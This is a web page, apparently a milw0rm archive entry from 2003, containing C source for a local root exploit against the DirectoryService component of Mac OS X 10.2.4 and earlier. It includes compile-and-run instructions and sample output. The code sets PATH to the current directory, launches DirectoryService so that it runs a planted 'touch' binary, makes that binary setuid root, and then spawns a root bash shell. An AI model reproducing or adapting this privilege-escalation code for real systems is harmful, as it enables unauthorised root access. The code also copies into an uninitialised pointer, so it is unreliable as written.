<html><head><title>Mac OS X <= 10.2.4 DirectoryService (PATH) Local Root Exploit</title></head><pre>/* 
   OS X &lt;= 10.2.4 DirectoryService local root PATH exploit
   DirectoryService must be crashed prior to execution, per
   @stake advisory.  If you discover how to crash DirectoryService
   e-mail me at neeko@haackey.com  [Neeko Oni]

--
Assuming DirectoryService has been crashed/killed, compile
this code as 'touch' (gcc osxds.c -o touch) and execute.

bash$ ./touch
*bunch of stuff here*
euid is root.
bash#

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int 
main(int argc, char **argv)
{
	char           *ORIGPATH;
	int             temp;
	if (argc &lt; 2) {
		if (geteuid() == 0) {
		printf(&quot;euid is root.\n&quot;);
		setuid(0);
		execl(&quot;/bin/bash&quot;, &quot;bash&quot;, NULL);
		}
		strcpy(ORIGPATH, getenv(&quot;PATH&quot;));
		printf(&quot;Original path: %s\n&quot;, ORIGPATH);
		setenv(&quot;PATH&quot;, &quot;.&quot;, 1);
		printf(&quot;New path: %s\n&quot;, getenv(&quot;PATH&quot;));
		printf(&quot;Executing DirectoryService with false PATH...\n&quot;);
		if (fork() == 0) {
			execl(&quot;/usr/sbin/DirectoryService&quot;, &quot;DirectoryService&quot;, NULL);
		}
		printf(&quot;Forked DirectoryService, pausing before shell exec...\n&quot;);
		sleep(3);
		printf(&quot;Cross your fingers.\n&quot;);
		setenv(&quot;PATH&quot;, ORIGPATH, 1);
		printf(&quot;Path restored: %s\n&quot;, getenv(&quot;PATH&quot;));
		execl(&quot;./touch&quot;, &quot;touch&quot;, NULL);		
	}
system(&quot;/usr/sbin/chown root ./touch;/bin/chmod +s ./touch&quot;);
}

// milw0rm.com [2003-04-18]</pre></html>